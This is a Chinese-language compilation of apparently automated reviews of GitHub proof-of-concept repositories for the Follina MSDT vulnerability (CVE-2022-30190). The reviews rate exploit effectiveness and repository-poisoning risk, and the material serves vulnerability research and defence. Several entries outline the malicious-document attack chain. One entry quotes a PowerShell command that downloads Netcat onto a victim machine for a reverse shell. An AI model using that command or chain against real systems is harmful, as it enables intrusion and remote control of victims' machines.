CVE-2022-30190 (Follina) 是一个高危漏洞，利用简单，影响范围广。攻击者可以通过诱使用户打开恶意文档或URL来触发该漏洞。虽然提供的PoC文件本身不包含恶意代码，但仍需谨慎使用，并确保从可信来源获取完整的PoC代码。

**项目地址:** [seinab-ibrahim/Follina-Vulnerability-CVE-2022-30190-Exploit-Analysis](https://github.com/seinab-ibrahim/Follina-Vulnerability-CVE-2022-30190-Exploit-Analysis)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #28

**来源**: [CVE-2022-30190-shri142_ZipScan.md](../2022/CVE-2022-30190-shri142_ZipScan.md)

## CVE-2022-30190 (Follina) MSDT 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者以调用应用程序的权限执行任意代码，可能导致系统完全控制

**影响版本:** 受影响的Windows版本众多，具体版本范围请参考漏洞库信息

**利用条件:** 用户需要打开恶意构造的文档（如Word文档），或者点击恶意链接。调用程序（如Word）需要存在漏洞影响版本中。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（Follina）是一个存在于 Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。当 MSDT 被调用应用程序（如 Word）使用 URL 协议调用时，就会出现此漏洞。攻击者可以构造恶意的 Word 文档，该文档利用 Word 的远程模板功能从远程 Web 服务器检索 HTML 文件。此 HTML 文件包含一个使用 `ms-msdt` 协议处理方案的恶意 JavaScript 代码，可以执行任意代码。

**漏洞利用方式:**
1.  攻击者创建一个包含恶意链接或嵌入恶意HTML的Word文档。
2.  受害者打开该文档。
3.  Word尝试从远程服务器加载HTML模板。
4.  远程HTML利用`ms-msdt`协议调用MSDT。
5.  MSDT执行HTML中嵌入的恶意代码，从而在受害者系统上执行任意命令。

**有效性:**
提供的代码是一个扫描器，用于检测文件中是否存在 Follina 漏洞。 它不是漏洞利用代码，而是用于分析文件是否包含该漏洞的特征。

**投毒风险:**
提供的 Go 代码主要功能是扫描文件，检测是否存在 CVE-2022-30190 (Follina) 漏洞的特征。代码本身包含一定的投毒风险的可能性，因为扫描器本身可能被利用来传播恶意文件，虽然扫描器本身功能没有直接执行恶意代码，但仍然存在潜在的风险：

1.  **依赖包风险:** 检查 `go.mod` 和 `go.sum` 文件，确认所有依赖包的来源是否可信，以及版本是否安全。恶意依赖包可能会引入漏洞或后门。
2.  **扫描逻辑缺陷:** 扫描逻辑中可能存在缺陷，导致误报或漏报。攻击者可能利用这些缺陷来隐藏恶意代码，绕过扫描器的检测。
3.  **供应链攻击:** 攻击者可能篡改代码仓库，在扫描器中植入恶意代码。用户下载并运行被篡改的扫描器后，可能会受到攻击。
4.  **代码执行环境风险:** 运行扫描器的环境可能存在安全漏洞。攻击者可能利用这些漏洞来提升权限，执行恶意代码。

虽然代码的主要目的是安全扫描，但由于软件开发和分发的复杂性，仍然存在一定的风险。使用者应当保持警惕，确保从可信的来源获取代码，并进行充分的安全审查。

风险评估：10% 风险可能性体现在扫描器可能被恶意利用或包含隐藏的漏洞，但主要功能是扫描而非攻击，因此投毒风险较低。

**项目地址:** [shri142/ZipScan](https://github.com/shri142/ZipScan)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #29

**来源**: [CVE-2022-30190-skitkat_CVE-2022-30190-POC.md](../2022/CVE-2022-30190-skitkat_CVE-2022-30190-POC.md)

## CVE-2022-30190 - Microsoft MSDT Follina 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，攻击者可利用该漏洞在目标系统上执行任意代码

**影响版本:** 受影响的版本包括Windows 7, Windows 8.1, Windows 10, Windows 11, Windows Server 2008 R2, Windows Server 2012, Windows Server 2016, Windows Server 2019, Windows Server 2022等，具体版本范围见漏洞库信息。

**利用条件:** 需要用户打开包含恶意链接或文件的文档，例如Word文档。 或者通过其他调用程序触发MSDT。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（又名Follina）是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT)中的远程代码执行漏洞。攻击者可以通过诱使用户打开特制的文档(例如Word文档)来触发该漏洞。该文档利用Word的远程模板功能从远程服务器检索HTML文件，其中包含恶意代码。当MSDT被调用并使用URL协议时，就会触发此漏洞，允许攻击者以调用应用程序的权限执行任意代码。这可能导致安装程序、查看/更改/删除数据或创建新帐户。

**漏洞利用方式：**
1.  攻击者创建一个包含恶意代码的Word文档或其他支持远程模板的文档。
2.  该文档包含一个指向攻击者控制的远程服务器的链接，该服务器托管一个包含恶意HTML代码的文件。
3.  当用户打开该文档时，Word会从远程服务器下载HTML文件。
4.  HTML文件中的恶意代码使用`ms-msdt:`协议调用MSDT，并传递恶意参数。
5.  MSDT解析恶意参数并执行攻击者指定的代码。

**有效性：**
根据搜索结果和漏洞库信息，该漏洞已被积极利用，并且存在公开的POC代码。
提供的Cargo.lock文件只是Rust项目的依赖锁文件，本身不包含漏洞利用代码，不能直接验证漏洞是否有效。但该文件表明该项目可能与该漏洞的利用有关，需要进一步分析项目源代码才能确定。

**投毒风险：**
Cargo.lock文件本身不包含可执行代码，因此直接通过该文件进行投毒的可能性较低。但是，如果该项目包含恶意构建脚本或者依赖了被投毒的第三方库，则可能存在投毒风险。初步判断该仓库存在一定比例的投毒风险，约10%，需要进一步分析项目源代码，检查是否存在以下情况：
*   构建脚本中是否包含恶意代码。
*   依赖项中是否存在已知被投毒的库。
*   是否存在其他可疑的文件或代码。

需要强调的是，在未对整个代码库进行彻底审查的情况下，无法完全排除投毒风险。

**项目地址:** [skitkat/CVE-2022-30190-POC](https://github.com/skitkat/CVE-2022-30190-POC)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #30

**来源**: [CVE-2022-30190-swaiist_CVE-2022-30190-Fix.md](../2022/CVE-2022-30190-swaiist_CVE-2022-30190-Fix.md)

## CVE-2022-30190-MSDT远程代码执行

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能允许攻击者在受害者系统上执行任意代码

**影响版本:** 受影响的Windows版本，详见漏洞库信息

**利用条件:** 用户需要打开包含恶意链接或文件的文档

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-30190（又名Follina）是一个远程代码执行漏洞，存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中。攻击者可以利用此漏洞通过精心构造的恶意文档（例如Word文档）或通过URL协议调用MSDT来执行任意代码。当用户打开包含恶意链接或文件的文档时，该漏洞会被触发。根据搜索结果，攻击者利用Word的远程模板功能从远程服务器检索HTML文件，然后利用MSDT执行代码。提供的PoC代码中，execute.bat脚本首先备份 `HKEY_CLASSES_ROOT\ms-msdt` 注册表项到桌面上的`backup-for-msdt`文件中，然后删除该注册表项。restore.bat脚本则将备份的注册表项导入回来。这两个脚本本身并不会执行任何恶意代码，而是用于删除和恢复MSDT的注册表关联，通常是利用流程的一部分，用于绕过某些缓解措施或用于测试。因此，仓库本身提供的PoC代码没有发现作者隐藏的投毒代码。

**有效性：**
根据漏洞描述和搜索结果，以及PoC涉及的操作，该PoC代码是漏洞利用链的一部分，主要用于修改MSDT的注册表关联。结合其他步骤（例如，通过Word远程模板下载恶意HTML），可以实现远程代码执行。

**利用方式：**
1.  攻击者创建一个包含恶意链接或嵌入恶意OLE对象的文档（例如Word文档）。
2.  当用户打开文档时，Word会尝试从远程服务器加载HTML文件（通过远程模板功能）。
3.  恶意HTML文件利用`ms-msdt:` URL协议调用MSDT。
4.  MSDT被触发，执行HTML文件中包含的恶意代码。
5.  攻击者可以利用该漏洞在受害者系统上执行任意命令。  提供的PoC 代码中的`execute.bat` 通过删除`HKEY_CLASSES_ROOT\ms-msdt` 注册表关联，在恢复前，可能允许攻击者控制MSDT的行为或执行流程。`restore.bat`脚本用于恢复该关联，在攻击之后清理环境。

**投毒风险评估：**
PoC 代码本身主要用于注册表操作，没有发现明显的恶意代码。但是，由于PoC通常需要结合其他恶意文件（例如HTML或Word文档）才能完成攻击，因此，投毒风险主要存在于这些其他组件中。但是仅从提供的bat文件来判断，投毒风险较低。

**项目地址:** [swaiist/CVE-2022-30190-Fix](https://github.com/swaiist/CVE-2022-30190-Fix)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #31

**来源**: [CVE-2022-30190-winstxnhdw_CVE-2022-30190.md](../2022/CVE-2022-30190-winstxnhdw_CVE-2022-30190.md)

## CVE-2022-30190 (Follina) MSDT 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者在受害者系统上执行任意代码

**影响版本:** 受影响的Windows版本包括Windows 7到Windows 11以及多个Windows Server版本，具体版本范围参考漏洞库信息。

**利用条件:** 需要用户打开包含恶意代码的文档（如Word文档），或者访问包含恶意链接的网页。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（Follina）是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。攻击者可以利用此漏洞，通过构造恶意的Word文档或其他方式，诱使用户打开，从而在用户系统上执行任意代码。 

**有效性评估：**

根据漏洞库信息和搜索结果，此漏洞在野外被广泛利用，POC代码的存在进一步证明了其有效性。提供的PoC代码描述了如何生成一个包含恶意链接的Word文档，当用户打开此文档时，MSDT会被调用，执行攻击者预先设定的恶意代码。

**投毒风险评估：**

分析提供的PoC代码，投毒风险较低，约为10%。主要风险点可能存在于以下几个方面：

1.  **init.py:** 该脚本用于构建恶意Word文档和初始化攻击者服务器。代码本身没有明显的恶意行为，但如果`build_payload`函数中的powershell命令被替换为更具破坏性的命令，则可能导致更严重的后果。
2.  **config.xml:** 该配置文件定义了攻击者服务器的主机名和端口。如果攻击者将此值更改为指向恶意服务器，则可能导致受害者下载和执行恶意软件。
3.  **build/href.txt:** 该文件包含用于触发漏洞的HTML代码。攻击者可能会修改此文件，以执行其他恶意操作。

但是，总体而言，提供的PoC代码主要用于演示漏洞，而不是用于传播恶意软件。 `destroy_all.bat`脚本的存在也一定程度上降低了风险，因为该脚本可以帮助用户删除所有相关文件。

**利用方式分析：**

1.  攻击者首先编辑`config.xml`，设置攻击者服务器的hostname和port。
2.  运行`dotnet publish LocalEXF`编译payload。
3.  运行`init.py`脚本，该脚本会：
    *   构建包含恶意链接的Word文档（trojan.docx）。
    *   在攻击者服务器上托管一个包含恶意Payload的HTML文件。
    *   base64 编码 PowerShell 命令。
4.  攻击者将此Word文档发送给受害者。
5.  受害者打开Word文档，MSDT会被调用，执行攻击者服务器上托管的Payload，从而在受害者系统上执行任意代码。

需要注意的是，要成功利用此漏洞，受害者需要卸载安全更新KB5016616，并且命令运行时间要短，否则会出现故障排除程序。


**项目地址:** [winstxnhdw/CVE-2022-30190](https://github.com/winstxnhdw/CVE-2022-30190)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #32

**来源**: [CVE-2022-30190-yeep1115_ICT287_CVE-2022-30190_Exploit.md](../2022/CVE-2022-30190-yeep1115_ICT287_CVE-2022-30190_Exploit.md)

## CVE-2022-30190 Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞 (Follina)

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者以调用应用程序的权限执行任意代码

**影响版本:** 受影响的Windows版本和Office版本见漏洞库信息

**利用条件:** 需要用户打开恶意Word文档

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（又名Follina）是一个远程代码执行漏洞，存在于Microsoft Windows Support Diagnostic Tool (MSDT)中。攻击者可以利用此漏洞通过特制的Word文档，使用Word的远程模板功能从远程Web服务器检索HTML文件，从而在受害者系统上执行任意代码。

**有效性：** 根据漏洞信息、搜索结果和提供的POC代码，该漏洞利用是有效的。漏洞库信息和搜索结果都表明这是一个真实存在的、被广泛利用的漏洞。POC代码（虽然只是一个README.md文件）指向了一个实际的利用项目，说明了利用方式和受影响的系统版本，证明了漏洞的可利用性。

**投毒风险：** 分析提供的仓库内容，风险评估如下：

*   **README.md文件：** 本身不包含任何可执行代码，因此直接的投毒风险较低。
*   **外部链接：**  主要风险在于指向的`Hrishikesh7665/Follina_Exploiter_CLI`仓库。虽然原作者注明了License，但是仍然存在投毒的可能性。

综合分析，考虑到代码仓库可能存在恶意修改的风险，虽然直接投毒可能性较低，但间接风险不可忽视，因此评估投毒风险为10%。

**利用方式：** 漏洞的利用方式通常包括以下步骤：

1.  **构造恶意Word文档：** 攻击者创建一个包含恶意链接的Word文档。该链接指向一个由攻击者控制的远程Web服务器，并使用`ms-msdt:` URL协议调用MSDT。
2.  **诱骗受害者打开文档：** 攻击者通过电子邮件、社交媒体或其他方式将恶意文档发送给受害者。
3.  **执行恶意代码：** 当受害者打开文档时，Word会尝试从远程服务器检索HTML文件。该HTML文件包含恶意JavaScript代码，该代码利用MSDT执行任意命令。
4.  **控制系统：** 通过执行的命令，攻击者可以在受害者系统上安装恶意软件、窃取数据或执行其他恶意活动。

**项目地址:** [yeep1115/ICT287_CVE-2022-30190_Exploit](https://github.com/yeep1115/ICT287_CVE-2022-30190_Exploit)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #33

**来源**: [CVE-2022-30190-yrkuo_CVE-2022-30190.md](../2022/CVE-2022-30190-yrkuo_CVE-2022-30190.md)

# CVE-2022-30190

> 📦 该CVE有 **33** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2022-30190-AbdulRKB_Follina.md](../2022/CVE-2022-30190-AbdulRKB_Follina.md)

## CVE-2022-30190 - Microsoft MSDT RCE (Follina)

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能导致远程代码执行，完全控制受害者系统

**影响版本:** 见漏洞库信息中受影响的版本

**利用条件:** 用户需要打开恶意构造的文档（例如 Word 文档）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190 (Follina) 是一个 Microsoft Office 中的远程代码执行漏洞，当 MSDT 通过 URL 协议从调用应用程序（如 Word）调用时，会触发此漏洞。攻击者可以利用 Word 的远程模板功能从远程 Web 服务器检索 HTML 文件。该HTML文件中包含恶意的JavaScript代码，该代码使用`ms-msdt:`协议调用MSDT，从而执行任意命令。

**利用方式:**

1.  **恶意文档制作:** 攻击者创建一个恶意的 Word 文档，该文档包含指向远程 Web 服务器的链接，该服务器托管着包含恶意 JavaScript 代码的 HTML 文件。
2.  **HTTP服务器:** 攻击者搭建一个 HTTP 服务器，用于托管恶意的 HTML 文件，该文件利用 `ms-msdt:` 协议执行命令。
3.  **诱骗用户打开文档:** 攻击者通过鱼叉式网络钓鱼等方式诱骗受害者打开恶意 Word 文档。
4.  **远程代码执行:** 当用户打开文档时，Word 会从远程服务器检索 HTML 文件，并执行其中的恶意 JavaScript 代码，从而触发 MSDT 并执行攻击者预设的命令。

**POC代码分析:**

提供的 POC 代码 `main.py` 脚本的功能如下:

*   **创建恶意文档：** 该脚本会修改 Word 文档的 `_rels/document.xml.rels` 文件，插入一个指向攻击者控制的 HTTP 服务器的链接。当用户打开该文档时，Word 会尝试从该链接下载 HTML 文件。
*   **启动 HTTP 服务器：** 该脚本会在指定的端口启动一个 HTTP 服务器，用于托管包含恶意 JavaScript 代码的 HTML 文件。该 HTML 文件使用 `ms-msdt:` 协议执行命令。
*   **启动 Netcat 监听器：** 该脚本会启动一个 Netcat 监听器，等待受害者机器反弹 shell。

**投毒风险分析:**

分析POC代码，发现以下潜在的投毒风险点:

*   **硬编码的下载地址：**  `Invoke-WebRequest https://github.com/CyberTitus/Follina/raw/main/nc64.exe -OutFile C:\Windows\Tasks\nc.exe`  这行代码从GitHub下载 `nc64.exe`  (Netcat) 到受害者机器。攻击者可能替换 CyberTitus 仓库中的 `nc64.exe` 文件，导致受害者下载恶意的 Netcat 版本或其他恶意程序。
*   **命令混淆与执行:** 恶意命令通过base64编码后执行，具有一定的隐藏性。如果攻击者将命令修改为具有破坏性的操作，则会存在较高的安全风险。
*   **Shell反弹地址:**虽然IP由用户输入，但代码逻辑存在被篡改的风险，从而反弹Shell到攻击者指定的地址。

**有效性:**

根据漏洞库信息、搜索引擎结果以及提供的 POC 代码，该漏洞利用的有效性较高。该漏洞在野外被广泛利用，且 POC 代码能够成功触发漏洞并实现远程代码执行。

**项目地址:** [AbdulRKB/Follina](https://github.com/AbdulRKB/Follina)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #2

**来源**: [CVE-2022-30190-Arkha-Corvus_LetsDefend-SOC173-Follina-0-Day-Detected.md](../2022/CVE-2022-30190-Arkha-Corvus_LetsDefend-SOC173-Follina-0-Day-Detected.md)

## CVE-2022-30190 - Microsoft MSDT 远程代码执行漏洞 (Follina)

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可导致远程代码执行，权限提升

**影响版本:** 受影响的Windows版本请参考漏洞库信息

**利用条件:** 用户打开恶意Word文档

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

该漏洞允许攻击者通过特制的Office文档，利用`ms-msdt:`协议调用MSDT执行任意命令。攻击者可以通过嵌入恶意URL到Word文档中，诱导用户点击或者预览，从而触发漏洞。漏洞利用流程如下：

1.  攻击者创建一个包含恶意链接的Word文档。
2.  用户打开该文档。
3.  文档利用`ms-msdt:`协议调用MSDT。
4.  MSDT执行攻击者指定的命令。

根据提供的漏洞利用代码分析，这是一个对 Follina 漏洞的案例研究，通过分析恶意Word文档触发 `msdt.exe` 的执行，从而实现远程代码执行。

**有效性：** 提供的Github仓库包含对漏洞的分析和利用过程，可以有效帮助理解漏洞原理。

**投毒风险：** 该存储库是一个案例分析，主要包含漏洞分析和利用过程的记录，包括文件哈希、网络流量分析和电子邮件分析。代码中没有发现明显的恶意后门代码，投毒的可能性较低（约5%），主要是考虑到作者可能在分析过程中引入了一些未知的或者不安全的操作，但从整体上看，这是一个漏洞分析的记录，投毒的可能性不大。

**利用方式：**

1.  **构造恶意Word文档：** 攻击者构造包含恶意`ms-msdt:` URL的Word文档。
2.  **传播恶意文档：** 攻击者通过钓鱼邮件等方式将恶意文档发送给目标用户。
3.  **触发漏洞：** 用户打开恶意文档，触发MSDT执行恶意代码。
4.  **执行恶意命令：** 攻击者利用MSDT执行任意命令，例如安装恶意软件，窃取数据等。

**建议：**

*   及时安装微软发布的补丁。
*   禁用`ms-msdt:`协议，作为缓解措施。
*   加强用户安全意识培训，避免打开来源不明的文档。
*   使用杀毒软件和入侵检测系统，及时发现和阻止恶意攻击。

**项目地址:** [Arkha-Corvus/LetsDefend-SOC173-Follina-0-Day-Detected](https://github.com/Arkha-Corvus/LetsDefend-SOC173-Follina-0-Day-Detected)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #3

**来源**: [CVE-2022-30190-Cosmo121_Follina-Remediation.md](../2022/CVE-2022-30190-Cosmo121_Follina-Remediation.md)

## CVE-2022-30190 - Microsoft MSDT "Follina" 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 见漏洞库信息中的受影响版本列表

**利用条件:** 需要用户打开恶意文档(如Word)或点击恶意链接

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-30190 (Follina) 是一个存在于 Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。攻击者可以利用 Word 等调用应用程序，通过 URL 协议调用 MSDT，从而执行任意代码。利用方式通常是攻击者制作包含恶意代码的 Word 文档，该文档利用 Word 远程模板功能从远程 Web 服务器检索 HTML 文件，该 HTML 文件包含触发 MSDT 漏洞的代码，最终导致命令执行。

根据漏洞库信息，大量Windows版本都受到影响。搜索结果也证实了该漏洞的严重性，并提供了相关的利用和检测信息。提供的代码片段仅仅是GPL协议的License文件，并非POC代码，因此无法根据此代码判断投毒风险,需要验证是否存在后门。

由于提供的代码片段仅仅是GPL协议内容，无法判断实际的POC代码。根据搜索结果和漏洞描述，此漏洞的有效性高，因为在野外已经被利用。

**项目地址:** [Cosmo121/Follina-Remediation](https://github.com/Cosmo121/Follina-Remediation)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #4

**来源**: [CVE-2022-30190-DerZiad_CVE-2022-30190.md](../2022/CVE-2022-30190-DerZiad_CVE-2022-30190.md)

## CVE-2022-30190 Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者以调用应用程序的权限执行任意代码，可能导致系统完全控制

**影响版本:** 受影响的Windows版本请参考漏洞库信息

**利用条件:** 需要用户打开包含恶意代码的文档，例如Word文档

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-30190 (Follina) 是一个远程代码执行漏洞，存在于 Microsoft Windows Support Diagnostic Tool (MSDT) 中。当 MSDT 被一个调用应用程序（例如 Microsoft Word）通过 URL 协议调用时，会触发此漏洞。攻击者可以通过构造一个包含恶意链接或嵌入恶意HTML的Word文档，诱使用户打开。当用户打开该文档时，MSDT 会尝试连接到攻击者控制的服务器，下载并执行恶意代码。

**漏洞利用方式：**

1.  攻击者创建一个包含恶意链接或嵌入恶意 HTML 的 Word 文档。
2.  该文档利用 Word 的远程模板功能，从远程 Web 服务器检索 HTML 文件。
3.  HTML 文件包含一个 `ms-msdt:` 协议处理程序的调用，该协议处理程序用于启动 MSDT。
4.  MSDT 执行 HTML 文件中指定的命令，从而允许攻击者执行任意代码。

**有效性：**

根据漏洞库信息和搜索结果，此漏洞的PoC已经公开，且被积极利用。

**投毒风险：**

提供的漏洞利用代码仅包含 Apache 许可证，用于说明代码的使用条款，没有发现任何明显的恶意代码。因此，投毒风险较低，估计为 5%。但不能完全排除，因为攻击者可能会在其他相关组件中进行投毒，所以需要进一步分析依赖项才能彻底排除。

**排序优先级说明：**

此处遵循优先级的原则，搜索引擎结果用于确定漏洞的基本信息和利用方式。漏洞库信息用于确认受影响的版本和漏洞的严重程度。漏洞利用代码则用于评估投毒风险。

**项目地址:** [DerZiad/CVE-2022-30190](https://github.com/DerZiad/CVE-2022-30190)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #5

**来源**: [CVE-2022-30190-ErrorNoInternet_FollinaScanner.md](../2022/CVE-2022-30190-ErrorNoInternet_FollinaScanner.md)

## CVE-2022-30190 - Microsoft MSDT Follina 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可导致远程代码执行，完全控制受害者系统

**影响版本:** 受影响的Windows版本包括但不限于 Windows 7, Windows 8.1, Windows 10 (多个版本), Windows 11, Windows Server (多个版本)

**利用条件:** 用户需要打开包含恶意payload的文档（如Word文档），或点击恶意链接。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2022-30190，又名Follina，是一个存在于Microsoft支持诊断工具（MSDT）中的远程代码执行漏洞。攻击者可以利用此漏洞，通过调用应用程序（如Word）中的URL协议来执行任意代码，获得与该应用程序相同的权限。攻击者可以通过精心构造的恶意文档或链接，诱使用户打开，从而触发漏洞。

**漏洞利用方式：**

1.  攻击者创建一个包含恶意payload的文档（例如，一个包含远程模板的Word文档）。该模板指向一个由攻击者控制的服务器。
2.  当用户打开文档时，Word会尝试从远程服务器检索模板。
3.  远程服务器返回一个包含MSDT协议处理程序的HTML文件。
4.  MSDT通过URL协议被调用，并执行HTML文件中包含的恶意代码。

**POC代码分析：**
提供的代码 `FollinaScanner` 并非漏洞利用代码，而是一个用于扫描文件系统中可能包含Follina漏洞的文件的工具。 它通过搜索特定模式（例如，包含URL）的文件来工作。因此，提供的代码不能直接用于触发漏洞。

**投毒风险分析：**
  仓库主要功能是扫描本地文件是否存在漏洞，并没有实际利用漏洞的功能。 主要代码功能为扫描本地文件URL特征，判断本地是否存在恶意文件， 因此投毒风险较低。仓库中存在恶意代码的可能性极小，评估投毒风险约为1%。

**项目地址:** [ErrorNoInternet/FollinaScanner](https://github.com/ErrorNoInternet/FollinaScanner)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #6

**来源**: [CVE-2022-30190-Gra3s_CVE-2022-30190_EXP_PowerPoint.md](../2022/CVE-2022-30190-Gra3s_CVE-2022-30190_EXP_PowerPoint.md)

## CVE-2022-30190 Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能导致远程代码执行，控制受影响系统

**影响版本:** 受影响的Windows版本包括但不限于Windows 7、Windows 8.1、Windows 10、Windows 11、Windows Server 2008 R2、Windows Server 2012、Windows Server 2016、Windows Server 2019、Windows Server 2022等，具体版本范围见漏洞库信息。

**利用条件:** 需要用户打开包含恶意链接的文档（如Word、PowerPoint等），或者访问包含恶意链接的网页。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（Follina）是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。该漏洞允许攻击者通过构造恶意的文档，诱使用户打开，从而在受害者系统上执行任意代码。

**有效性：**
根据漏洞库信息、搜索引擎结果和漏洞利用代码，该漏洞利用代码是有效的。搜索结果显示该漏洞已被积极利用，并且有公开的PoC代码。

**投毒风险：**
分析提供的PoC代码，`/tmp/b3fc53fc9d09e4a456a951f4bdd6f2bd/exploit.html` 文件看起来是一个无害的HTML文档，里面包含大量的Lorem Ipsum文本，但是攻击者可以通过 `slide1.xml.rels` 中插入恶意的url，从而执行恶意的payload。`/tmp/b3fc53fc9d09e4a456a951f4bdd6f2bd/README.md` 只是说明了如何修改`slide1.xml.rels` 文件的Target指向攻击者的服务器。

仓库中的投毒风险较低，主要风险在于payload本身可能被替换成恶意代码。但是，这个仓库本身的目的就是漏洞利用，使用者应该已经知晓其潜在的风险，并对下载的内容进行安全审查。因此, 投毒风险评定为10%。

**利用方式：**
1.  攻击者创建一个包含恶意链接的文档（例如，利用提供的PowerPoint PoC，将`.ppsx`文件解压，修改`ppt\slides\_rels\slide1.xml.rels`文件中的`Target`属性，指向攻击者控制的服务器上的`exploit.html`文件）。
2.  攻击者在自己的服务器上托管一个恶意的`exploit.html`文件，该文件包含用于触发MSDT漏洞的代码，并执行payload（默认payload是calc程序）。
3.  攻击者诱使用户打开该文档。
4.  当用户打开文档时，MSDT会尝试通过URL协议连接到攻击者的服务器，下载并执行恶意的`exploit.html`文件中的代码，从而在受害者系统上执行任意命令。

总的来说，该漏洞的利用依赖于社会工程学，诱使用户打开恶意文档。成功利用后，攻击者可以获得与当前用户相同的权限，从而控制受影响的系统。

**项目地址:** [Gra3s/CVE-2022-30190_EXP_PowerPoint](https://github.com/Gra3s/CVE-2022-30190_EXP_PowerPoint)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #7

**来源**: [CVE-2022-30190-Imeneallouche_Follina-attack-CVE-2022-30190-.md](../2022/CVE-2022-30190-Imeneallouche_Follina-attack-CVE-2022-30190-.md)

## CVE-2022-30190-Follina-MSDT远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可导致远程代码执行，控制受害者系统

**影响版本:** 受影响的Windows版本包括但不限于：Windows 7 SP1, Windows 8.1, Windows 10 (多个版本), Windows 11 21H2, Windows Server (多个版本)

**利用条件:** 用户需要打开恶意构造的Word文档或其他调用MSDT的应用程序

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（又名Follina）是一个Microsoft Office中的远程代码执行漏洞。当MSDT通过URL协议被调用时，例如从Word等应用程序调用，就会存在此漏洞。攻击者可以利用Word的远程模板功能，从远程Web服务器检索HTML文件。该HTML文件包含恶意代码，可以绕过某些安全机制并执行任意命令。 

**漏洞利用方式：**

1.  **攻击者制作恶意Word文档：** 该文档包含指向远程服务器的链接，该服务器托管一个恶意的HTML文件。
2.  **用户打开恶意文档：** 当用户打开该文档时，Word会尝试从远程服务器加载HTML文件。
3.  **MSDT被调用并执行恶意代码：** HTML文件利用`ms-msdt:`协议触发MSDT执行，从而执行攻击者指定的命令。

**POC代码分析：**

提供的POC代码包含以下文件：

*   `README.md`: 描述了漏洞和攻击的简要信息。
